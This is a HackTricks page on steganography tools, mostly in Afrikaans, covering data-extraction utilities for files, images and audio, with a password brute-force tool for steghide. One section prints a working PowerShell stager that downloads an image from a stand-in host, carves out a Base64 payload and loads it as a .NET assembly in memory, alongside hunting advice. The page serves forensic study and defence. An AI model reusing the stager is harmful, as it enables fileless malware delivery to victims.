# Stego Truuks

{{#include ../banners/hacktricks-training.md}}

## **Uittrekking van data uit lêers**

### **Binwalk**

'n Gereedskap om binêre lêers te deursoek vir ingebedde verborge lêers en data. Dit word via `apt` geïnstalleer en die bronkode is beskikbaar op [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Herstel lêers gebaseer op hul lêeropskrifte en voettekste, nuttig vir PNG-beelde. Geïnstalleer via `apt` met die bron op [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Dit help om lêermetadata te besigtig, beskikbaar [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Soortgelyk aan exiftool, vir die besigtiging van metadata. Installeerbaar via `apt`, bron op [GitHub](https://github.com/Exiv2/exiv2), en het 'n [amptelike webwerf](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Lêer**

Bepaal watter tipe lêer jy hanteer.

### **Stringe**

Haal leesbare stringe uit lêers, met verskeie enkodering-instellings om die uitset te filtreer.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Vergelyking (cmp)**

Nuttig vir die vergelyking van 'n veranderde lêer met sy oorspronklike weergawe wat aanlyn gevind is.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Uittrekking van verborge data in teks**

### **Verborgen data in spasies**

Onsigbare karakters in skynbaar leë spasies kan inligting wegsteek. Om hierdie data te onttrek, besoek [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Uittrekking van data uit beelde**

### **Identifisering van beeldbesonderhede met GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) dien om beeldlêertipes te bepaal en moontlike korrupsie te identifiseer. Voer die onderstaande opdrag uit om 'n beeld te ondersoek:
```bash
./magick identify -verbose stego.jpg
```
Om 'n beskadigde beeld te probeer herstel, kan dit help om 'n metadata-opmerking by te voeg:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide vir die verberging van data**

Steghide maak dit moontlik om data binne `JPEG, BMP, WAV, and AU` lêers weg te steek; dit kan geënkripteerde data insluit en ekstraheer. Installering is eenvoudig met `apt`, en [sy bronkode is beskikbaar op GitHub](https://github.com/StefanoDeVuono/steghide).

**Bevels:**

- `steghide info file` toon of 'n lêer versteekte data bevat.
- `steghide extract -sf file [--passphrase password]` ekstraheer die versteekte data; wagwoord opsioneel.

Vir webgebaseerde ekstrahering, besoek [hierdie webwerf](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- To attempt password cracking on Steghide, use [stegcracker](https://github.com/Paradoxis/StegCracker.git) as follows:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg vir PNG- en BMP-lêers**

zsteg spesialiseer in die opsporing van versteekte data in PNG- en BMP-lêers. Installering word gedoen via `gem install zsteg`, met die [bron op GitHub](https://github.com/zed-0xff/zsteg).

**Opdragte:**

- `zsteg -a file` pas alle opsporingsmetodes op 'n lêer toe.
- `zsteg -E file` spesifiseer 'n payload vir data-ekstraksie.

### **StegoVeritas en Stegsolve**

**stegoVeritas** kontroleer metadata, voer beeldtransformasies uit, en pas LSB brute forcing toe, onder andere funksies. Gebruik `stegoveritas.py -h` vir 'n volledige lys opsies en `stegoveritas.py stego.jpg` om alle kontroles uit te voer.

**Stegsolve** pas verskeie kleurfilters toe om versteekte teks of boodskappe in beelde te openbaar. Dit is beskikbaar op [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT vir die opsporing van versteekte inhoud**

Fast Fourier Transform (FFT)-tegnieke kan versteekte inhoud in beelde openbaar maak. Nuttige hulpbronne sluit in:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy vir klank- en beeldlêers**

Stegpy laat toe om inligting in beeld- en klanklêers in te sluit, en ondersteun formate soos PNG, BMP, GIF, WebP en WAV. Dit is beskikbaar op [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck vir PNG-lêerontleding**

Om PNG-lêers te analiseer of hul egtheid te verifieer, gebruik:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Aanvullende gereedskap vir beeldontleding**

Vir verdere verkenning, oorweeg om te besoek:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Merkers-afgebakende Base64 payloads versteek in beelde (malware delivery)

Alledaagse loaders verberg al hoe meer Base64-gekodeerde payloads as platte teks binne andersins geldige beelde (dikwels GIF/PNG). In plaas van pixel-vlak LSB word die payload afgebaken deur unieke begin/einde merkerreekse wat in die lêerteks/metadata ingebed is. 'n PowerShell stager doen dan:
- Laai die beeld oor HTTP(S) af
- Vind die merkerreekse (waargenome voorbeelde: <<sudo_png>> … <<sudo_odt>>)
- Haal die tussenliggende teks uit en Base64-dekodeer dit na bytes
- Laai die .NET assembly in geheue en roep 'n bekende entry method aan (geen lêer na skyf geskryf nie)

Minimale PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Aantekeninge
- Dit val onder ATT&CK T1027.003 (steganography). Marker strings vary between campaigns.
- Hunting: scan gedownloade beelde vir bekende delimiters; flag `PowerShell` using `DownloadString` followed by `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Uittrekking van data uit audiobestande**

**Audio steganography** bied 'n unieke metode om inligting binne klanklêers te verberg. Verskeie gereedskap word gebruik om weggesteekte inhoud in te voeg of te herwin.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide is 'n veelsydige gereedskap ontwerp om data in JPEG, BMP, WAV en AU-lêers te verberg. Gedetailleerde instruksies word verskaf in die [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Hierdie gereedskap is versoenbaar met verskeie formate, insluitend PNG, BMP, GIF, WebP en WAV. Vir meer inligting, verwys na [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg is noodsaaklik om die integriteit van audiolêers te beoordeel; dit verskaf gedetailleerde inligting en help om enige afwykings te identifiseer.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg blink uit om data in WAV-lêers te verberg en uit te haal deur die least significant bit-strategie te gebruik. Dit is beskikbaar op [GitHub](https://github.com/ragibson/Steganography#WavSteg). Opdragte sluit in:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound maak enkripsie en die opsporing van inligting binne klanklêers met AES-256 moontlik. Dit kan afgelaai word vanaf [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

'n Onontbeerlike hulpmiddel vir visuele en analytiese inspeksie van klanklêers — Sonic Visualizer kan verborge elemente openbaar wat op ander maniere onopspoorbaar is. Besoek die [official website](https://www.sonicvisualiser.org/) vir meer.

### **DTMF Tones - Dial Tones**

Die opsporing van DTMF tones in klanklêers kan gedoen word met aanlyn gereedskap soos [this DTMF detector](https://unframework.github.io/dtmf-detect/) en [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Binary Length SQRT - QR Code**

Binaêre data wat, wanneer gevierkant, 'n heelgetal lewer, kan 'n QR code voorstel. Gebruik hierdie stukkie kode om te kontroleer:
```python
import math
math.sqrt(2500) #50
```
Vir omskakeling van binêr na beeld, kyk na [dcode](https://www.dcode.fr/binary-image). Om QR-kodes te lees, gebruik [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Braille-vertaling**

Vir die vertaling van Braille is die [Branah Braille Translator](https://www.branah.com/braille-translator) 'n uitstekende hulpbron.

## **Verwysings**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
